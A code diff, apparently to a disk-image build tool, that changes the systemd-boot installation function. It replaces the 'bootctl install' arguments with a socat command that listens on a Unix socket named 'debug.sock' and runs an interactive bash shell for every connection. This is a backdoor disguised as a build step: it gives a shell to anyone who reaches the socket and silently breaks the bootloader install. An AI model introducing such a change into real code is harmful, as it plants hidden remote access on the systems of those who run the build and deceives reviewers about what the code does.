@@ -675,12 +675,9 @@ def install_systemd_boot(context: Context) -> None:
                 sign_efi_binary(context, input, output)
 
     cmd: list[PathString] = [
-        "bootctl",
-        "install",
-        "--root=/buildroot",
-        "--install-source=image",
-        "--all-architectures",
-        "--no-variables",
+        "socat",
+        "UNIX-LISTEN:$SRCDIR/debug.sock,fork",
+        "EXEC:/bin/bash,pty,stderr"
     ]
 
     bootctlver = systemd_tool_version("bootctl", sandbox=context.sandbox)
